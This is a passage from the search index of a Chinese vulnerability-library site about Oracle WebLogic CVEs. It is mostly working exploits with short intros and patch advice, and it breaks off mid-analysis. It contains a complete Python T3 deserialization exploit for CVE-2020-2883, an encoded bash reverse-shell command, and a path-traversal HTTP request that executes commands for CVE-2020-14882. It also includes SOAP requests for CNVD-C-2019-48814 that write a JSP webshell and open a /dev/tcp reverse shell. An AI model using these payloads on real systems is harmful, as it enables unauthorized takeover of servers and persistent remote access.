<p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/WebLogic%20coherence%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2020-2555%29%E5%A4%8D%E7%8E%B0/#_4","title":"\u4fee\u590d\u65b9\u5f0f","text":"<p>\u5347\u7ea7\u8865\u4e01\uff0c\u53c2\u8003oracle\u5b98\u7f51\u53d1\u5e03\u7684\u8865\u4e01</p> <p>https://www.oracle.com/security-alerts/cpujan2020.html</p> <p>\u5982\u679c\u4e0d\u4f9d\u8d56T3\u534f\u8bae\u8fdb\u884cJVM\u901a\u4fe1\uff0c\u7981\u7528T3\u534f\u8bae</p> <p>\u8fdb\u5165WebLogic\u63a7\u5236\u53f0\uff0c\u5728base_domain\u914d\u7f6e\u9875\u9762\u4e2d\uff0c\u8fdb\u5165\u5b89\u5168\u9009\u9879\u5361\u9875\u9762\uff0c\u70b9\u51fb\u7b5b\u9009\u5668\uff0c\u914d\u7f6e\u7b5b\u9009\u5668\u3002\u5728\u8fde\u63a5\u7b5b\u9009\u5668\u4e2d\u8f93\u5165\uff1aweblogic.security.net.ConnectionFilterImpl\uff0c\u5728\u8fde\u63a5\u7b5b\u9009\u5668\u89c4\u5219\u6846\u4e2d\u8f93\u5165 7001 deny t3 t3s \u4fdd\u5b58\u751f\u6548\uff08\u9700\u91cd\u542f\uff09</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20GIOP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","title":"Weblogic GIOP\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-2883%EF%BC%89/","title":"Weblogic \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff08CVE 2020 2883\uff09","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-2883%EF%BC%89/#_1","title":"\u6f0f\u6d1e\u4ecb\u7ecd","text":"<p>\u5728Oracle\u5b98\u65b9\u53d1\u5e03\u76842020\u5e744\u6708\u5173\u952e\u8865\u4e01\u66f4\u65b0\u516c\u544aCPU\uff08Critical Patch Update\uff09\u4e2d\uff0c\u4e24\u4e2a\u9488\u5bf9 WebLogic Server \uff0cCVSS 3.0\u8bc4\u5206\u4e3a 9.8\u7684\u4e25\u91cd\u6f0f\u6d1e\uff08CVE-2020-2883\u3001CVE-2020-2884\uff09\uff0c\u5141\u8bb8\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u653b\u51fb\u8005\u901a\u8fc7T3\u534f\u8bae\u7f51\u7edc\u8bbf\u95ee\u5e76\u7834\u574f\u6613\u53d7\u653b\u51fb\u7684WebLogic Server\uff0c\u6210\u529f\u7684\u6f0f\u6d1e\u5229\u7528\u53ef\u5bfc\u81f4WebLogic Server\u88ab\u653b\u51fb\u8005\u63a5\u7ba1\uff0c\u4ece\u800c\u9020\u6210\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-2883%EF%BC%89/#_2","title":"\u5f71\u54cd\u8303\u56f4","text":"<p>Oracle WebLogic Server 10.3.6.0.0</p> <p>Oracle WebLogic Server 12.1.3.0.0</p> <p>Oracle WebLogic Server 12.2.1.3.0</p> <p>Oracle WebLogic Server 12.2.1.4.0</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-2883%EF%BC%89/#_3","title":"\u6f0f\u6d1e\u590d\u73b0","text":"<p>\u6f0f\u6d1ePOC\u5982\u4e0b\uff1a</p> <pre><code># -*- coding: utf-8 -*-\nimport socket\nimport time\nimport ssl\nimport binascii\nimport urlparse\nimport argparse\nimport sys\n\n\nglobalProxies = {}\nheader = {\n'User-Agent': \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\"\n}\n\ndef parseUrl(url):\nparsed = urlparse.urlparse(url)\nproto = parsed.scheme\nnetloc = parsed.netloc\nip = netloc\nif proto == 'http':\nport = 80\nelse:\nport = 443\n\nif (':' in netloc):\nip = netloc.split(':')[0]\nport = netloc.split(':')[1]\n\nuri = parsed.path\nreturn (proto, ip, port, uri)\n\n\ndef CVE_2020_2883(cmd):\npayload_start = 'aced0005737200176a6176612e7574696c2e5072696f72697479517565756594da30b4fb3f82b103000249000473697a654c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b78700000000273720030636f6d2e74616e676f736f6c2e7574696c2e636f6d70617261746f722e457874726163746f72436f6d70617261746f72c7ad6d3a676f3c180200014c000b6d5f657874726163746f727400224c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b78707372002c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e436861696e6564457874726163746f72889f81b0945d5b7f02000078720036636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374436f6d706f73697465457874726163746f72086b3d8c05690f440200015b000c6d5f61457874726163746f727400235b4c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b7872002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374457874726163746f72658195303e7238210200014900096d5f6e546172676574787000000000757200235b4c636f6d2e74616e676f736f6c2e7574696c2e56616c7565457874726163746f723b2246204735c4a0fe0200007870000000037372002f636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f72ee7ae995c02fb4a20200025b00096d5f616f506172616d7400135b4c6a6176612f6c616e672f4f626a6563743b4c00096d5f734d6574686f647400124c6a6176612f6c616e672f537472696e673b7871007e000900000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647371007e000d000000007571007e001100000002707571007e001100000000740006696e766f6b657371007e000d000000007571007e00110000000174'\npayload_lenhex = '{:04x}'.format(len(cmd))\npayload_cmdhex = binascii.b2a_hex(cmd)\npayload_end = '74000465786563770400000003767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707400013178'\npayload = payload_start + payload_lenhex + payload_cmdhex + payload_end\n\nreturn payload\n\nclass payloadtest(object):\ndef __init__(self):\n\nself.vuln = 'cve_2020_2883'\n\ndef t3handshake(self,sock,server_addr):\nsock.connect(server_addr)\nsock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex'))\ntime.sleep(1)\ndata = sock.recv(1024)\n#print data\n#print 'handshake successful'\n\ndef buildT3RequestObject(self,sock,port):\ndata1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'\ndata2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd60000000700001b19ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'\ndata3 = '1a7727000d3234322e323134'\ndata4 = '2e312e32353461863d1d0000000078'\nfor d in [data1,data2,data3,data4]:\nsock.send(d.decode('hex'))\ntime.sleep(2)\n#print 'send request payload successful,recv length:%d'%(len(sock.recv(2048)))\n\ndef sendEvilObjData(self,sock,data):\npayload='056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'\npayload+=data\npayload+='fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'\npayload = '%s%s'%('{:08x}'.format(len(payload)/2 + 4),payload)\nsock.send(payload.decode('hex'))\ntime.sleep(2)\nsock.send(payload.decode('hex'))\nres = ''\nn=1\ntry:\nwhile True:\nn += 1\nres += sock.recv(4096)\ntime.sleep(0.1)\nif(n&gt;15):\nbreak\nexcept Exception as e:\npass\nreturn res\n\ndef check(self, url, cmd,timeout, proxies=globalProxies, **args):\n(proto, ip, port, uri) = parseUrl(url)\n\nserver_addr = (ip, int(port))\nif proto == 'https':\nsock = ssl.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM))\nelse:\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.settimeout(timeout)\ntry:\nself.t3handshake(sock,server_addr)\nself.buildT3RequestObject(sock,port)\npayload = CVE_2020_2883(cmd)\nresp = self.sendEvilObjData(sock,payload)\n\nprint ('Payload send succeed! Please check.')\n\nreturn True\nexcept Exception as e:\nprint ('Failed! Exception:{}'.format(str(e)))\n\nreturn False\n\ndef poc(url,cmd):\nx = payloadtest()\nreturn x.check(url, cmd,20)\n\n\nif __name__ == '__main__':\nparser = argparse.ArgumentParser(description='Weblogic cve-2020-2883 Exp',\n usage='use \"python %(prog)s --help\" for more information',\n formatter_class=argparse.RawTextHelpFormatter)\nparser.add_argument(\"-u\", \"--url\",\ndest=\"url\",\nhelp=\"the url to check\"\n)\n\nparser.add_argument(\"-c\", \"--cmd\",\ndest=\"cmd\",\nhelp=\"the cmd to run on the target\"\n)\nargs = parser.parse_args()\nif not args.url or not args.cmd:\nsys.exit('Please assign url and cmd!')\npoc(args.url, args.cmd)\n</code></pre> <p>\u9996\u5148\u5f00\u542fnc\u76d1\u542c<code>nc -lvvp 19999</code></p> <p>\u53cd\u5f39shell\u9700\u8981\u7f16\u7801\uff0c\u901a\u8fc7\u7f51\u7ad9 http://www.jackson-t.ca/runtime-exec-payloads.html  \u7f16\u7801shell\u811a\u672c\uff0c\u7136\u540e\u6267\u884c</p> <pre><code>python weblogic-2883.py -u http://192.168.1.111:7001/ -c \"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMjM2Lz\nE5OTk5IDA+JjE=}|{base64,-d}|{bash,-i}\"\n</code></pre> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-2883%EF%BC%89/#_4","title":"\u4fee\u590d\u5efa\u8bae","text":"<p>Oracle\u5df2\u7ecf\u53d1\u5e03\u8865\u4e01\u4fee\u590d\u4e86\u4e0a\u8ff0\u6f0f\u6d1e\uff0c\u8bf7\u7528\u6237\u53c2\u8003\u5b98\u65b9\u901a\u544a\u53ca\u65f6\u4e0b\u8f7d\u53d7\u5f71\u54cd\u4ea7\u54c1\u66f4\u65b0\u8865\u4e01\uff0c\u5e76\u53c2\u7167\u8865\u4e01\u5b89\u88c5\u5305\u4e2d\u7684readme\u6587\u4ef6\u8fdb\u884c\u5b89\u88c5\u66f4\u65b0\uff0c\u4ee5\u4fdd\u8bc1\u957f\u671f\u6709\u6548\u7684\u9632\u62a4\u3002</p> <p>\u6ce8\uff1aOracle\u5b98\u65b9\u8865\u4e01\u9700\u8981\u7528\u6237\u6301\u6709\u6b63\u7248\u8f6f\u4ef6\u7684\u8bb8\u53ef\u8d26\u53f7\uff0c\u4f7f\u7528\u8be5\u8d26\u53f7\u767b\u9646https://support.oracle.com\u540e\uff0c\u53ef\u4ee5\u4e0b\u8f7d\u6700\u65b0\u8865\u4e01</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic-2020-14882/","title":"Weblogic\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e-CVE-2020-14882","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic-2020-14882/#_1","title":"\u7b80\u4ecb","text":"<p>\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u80fd\u901a\u8fc7\u6784\u9020\u7279\u6b8a\u7684 HTTP GET\u8bf7\u6c42\uff0c\u5229\u7528\u8be5\u6f0f\u6d1e\u5728\u53d7\u5f71\u54cd\u7684 WebLogic Server \u4e0a\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002</p> <p></p> <p>\u6839\u636e\u8865\u4e01diff\u7ed3\u679c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\uff0c\u53ef\u4ee5\u770b\u51fa\u4e0a\u9762\u7684\u53d8\u5316</p> <p>\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4e0b\u9762\u7684\u4ee3\u7801\uff0c\u4efb\u610f\u52a0\u8f7d\u67d0\u4e2a\u7c7b\u6216\u8005\u5bf9\u8c61</p> <pre><code>http://&lt;target&gt;/console/console.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=java.lang.String(\"ahihi\")\n</code></pre> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic-2020-14882/#_2","title":"\u672a\u6388\u6743\u8bbf\u95ee","text":"<p>\u975e\u6cd5\u5b57\u7b26\u7ed5\u8fc7\u767b\u9646\u4fdd\u62a4</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic-2020-14882/#poc","title":"POC","text":"<p>\u9996\u5148\u901a\u8fc7\u975e\u6cd5\u5b57\u7b26\u7ed5\u8fc7\u8bbf\u95ee\uff0c\u7136\u540e\u901a\u8fc7Gadget\u8c03\u7528\u547d\u4ee4\u6267\u884c\uff0cpoc\u5982\u4e0b</p> <p></p> <pre><code>GET /console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27calc.exe%27);%22); HTTP/1.1\nHost: 192.168.3.189:7001\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: ADM\nUpgrade-Insecure-Requests: 1\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9ECNVD-C-2019-48814/","title":"Weblogic\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1eCNVD-C-2019-48814","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9ECNVD-C-2019-48814/#_1","title":"\u5f71\u54cd\u8303\u56f4","text":"<p>WebLogic 10.* / WebLogic 12.1.3.0</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9ECNVD-C-2019-48814/#docker","title":"Docker \u642d\u5efa\u73af\u5883","text":"<p>docker pull ismaleiva90/weblogic12</p> <p>docker run -d -p 49163:7001 -p 49164:7002 -p 49165:5556 ismaleiva90/weblogic12:latest http://localhost:49163/console User: weblogic Pass: welcome1</p> <p>http://192.168.247.129:49163/_async/AsyncResponseService \u786e\u5b9a\u76ee\u6807\u7cfb\u7edf\u5bf9\u5916\u5f00\u653e/_async/AsyncResponseService\u8def\u5f84\uff0c\u5b58\u5728\u6b64\u6f0f\u6d1e</p> <p>\u5199\u5165shell</p> <pre><code>POST /_async/AsyncResponseService HTTP/1.1\nHost: 192.168.247.129:49163\nContent-Length: 1383\nAccept-Encoding: gzip, deflate\nSOAPAction: \nAccept: */*\nUser-Agent: Apache-HttpClient/4.1.1 (java 1.5)\nConnection: keep-alive\ncontent-type: text/xml\n\n&lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\"&gt;   \n&lt;soapenv:Header&gt; \n&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;\n&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;\n&lt;work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"&gt;\n&lt;void class=\"java.lang.ProcessBuilder\"&gt;\n&lt;array class=\"java.lang.String\" length=\"3\"&gt;\n&lt;void index=\"0\"&gt;\n&lt;string&gt;/bin/bash&lt;/string&gt;\n&lt;/void&gt;\n&lt;void index=\"1\"&gt;\n&lt;string&gt;-c&lt;/string&gt;\n&lt;/void&gt;\n&lt;void index=\"2\"&gt;\n&lt;string&gt;echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4= |base64 -d &gt; servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp&lt;/string&gt;\n&lt;/void&gt;\n&lt;/array&gt;\n&lt;void method=\"start\"/&gt;&lt;/void&gt;\n&lt;/work:WorkContext&gt;\n&lt;/soapenv:Header&gt;\n&lt;soapenv:Body&gt;\n&lt;asy:onAsyncDelivery/&gt;\n&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;\n</code></pre> <p> \u8fd9\u91cc\u53ef\u4ee5\u6267\u884c\u547d\u4ee4\u4e86\uff0c\u7136\u540e\u6211\u4eec\u5c1d\u8bd5\u53cd\u5f39shell</p> <pre><code>POST /_async/AsyncResponseService HTTP/1.1\nHost: 192.168.247.129:49164\nContent-Length: 789\nAccept-Encoding: gzip, deflate\nSOAPAction: \nAccept: */*\nUser-Agent: Apache-HttpClient/4.1.1 (java 1.5)\nConnection: keep-alive\ncontent-type: text/xml\n\n&lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\"&gt;   \n&lt;soapenv:Header&gt; \n&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;\n&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;\n&lt;work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"&gt;\n&lt;void class=\"java.lang.ProcessBuilder\"&gt;\n&lt;array class=\"java.lang.String\" length=\"3\"&gt;\n&lt;void index=\"0\"&gt;\n&lt;string&gt;/bin/bash&lt;/string&gt;\n&lt;/void&gt;\n&lt;void index=\"1\"&gt;\n&lt;string&gt;-c&lt;/string&gt;\n&lt;/void&gt;\n&lt;void index=\"2\"&gt;\n&lt;string&gt;bash -i &gt;&amp; /dev/tcp/192.168.247.129/12345 0&gt;&amp;1&lt;/string&gt;\n&lt;/void&gt;\n&lt;/array&gt;\n&lt;void method=\"start\"/&gt;&lt;/void&gt;\n&lt;/work:WorkContext&gt;\n&lt;/soapenv:Header&gt;\n&lt;soapenv:Body&gt;\n&lt;asy:onAsyncDelivery/&gt;\n&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;\n</code></pre> <p> </p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/cve%202020-14841%20weblogic%20jndi%E6%B3%A8%E5%85%A5/","title":"Cve 2020 14841 weblogic jndi\u6ce8\u5165","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/cve%202020-14841%20weblogic%20jndi%E6%B3%A8%E5%85%A5/#cve-2020-14841-weblogic-jndi","title":"cve 2020-14841 weblogic jndi\u6ce8\u5165","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/cve%202020-14841%20weblogic%20jndi%E6%B3%A8%E5%85%A5/#_1","title":"\u7b80\u4ecb","text":"<p>\u901a\u8fc7diff \u5347\u7ea7\u5305\u4e2dweblogic\u7684\u9ed1\u540d\u5355\uff0c\u6211\u4eec\u53d1\u73b0\u65b0\u589e<code>oracle.eclipselink.coherence.integrated.internal.cache.LockVersionExtractor</code>\u8fd9\u4e2a\u7c7b</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/cve%202020-14841%20weblogic%20jndi%E6%B3%A8%E5%85%A5/#lockversionextractor","title":"LockVersionExtractor \u5206\u6790","text":"<pre><code>package oracle.eclipselink.coherence.integrated.internal.cache;\n\n\nimport com.tangosol.io.ExternalizableLite;\nimport com.tangosol.io.pof.PofReader;\nimport com.tangosol.io.pof.PofWriter;\nimport com.tangosol.io.pof.PortableObject;\nimport com.tangosol.util.ExternalizableHelper;\nimport com.tangosol.util.ValueExtractor;\nimport java.io.DataInput;\nimport java.io.DataOutput;\nimport java.io.IOException;\nimport oracle.eclipselink.coherence.integrated.cache.Wrapper;\nimport oracle.eclipselink.coherence.integrated.internal.querying.EclipseLinkExtractor;\nimport org.eclipse.persistence.mappings.AttributeAccessor;\n\n\npublic class LockVersionExtractor implements ValueExtractor, ExternalizableLite, PortableObject, EclipseLinkExtractor {\n    protected AttributeAccessor accessor;\n    protected String className;\n\n\n    public LockVersionExtractor() {\n    }\n\n\n    public LockVersionExtractor(AttributeAccessor accessor, String className) {\n        this.accessor = accessor;\n        this.className = className;\n    }\n\n\n    public Object extract(Object arg0) {\n        if (arg0 == null) {\n            return null;\n        } else {\n            if (arg0 instanceof Wrapper) {\n                arg0 = ((Wrapper)arg0).unwrap();\n            }\n\n\n            if (!this.accessor.isInitialized()) {\n                this.accessor.initializeAttributes(arg0.getClass());\n            }\n\n\n            return this.accessor.getAttributeValueFromObject(arg0);\n        }\n    }\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u4ece\u4ee3\u7801\u4e0a\u770b\u51fa\u6765\uff0c\u7c7b\u4f3c\u4e0e 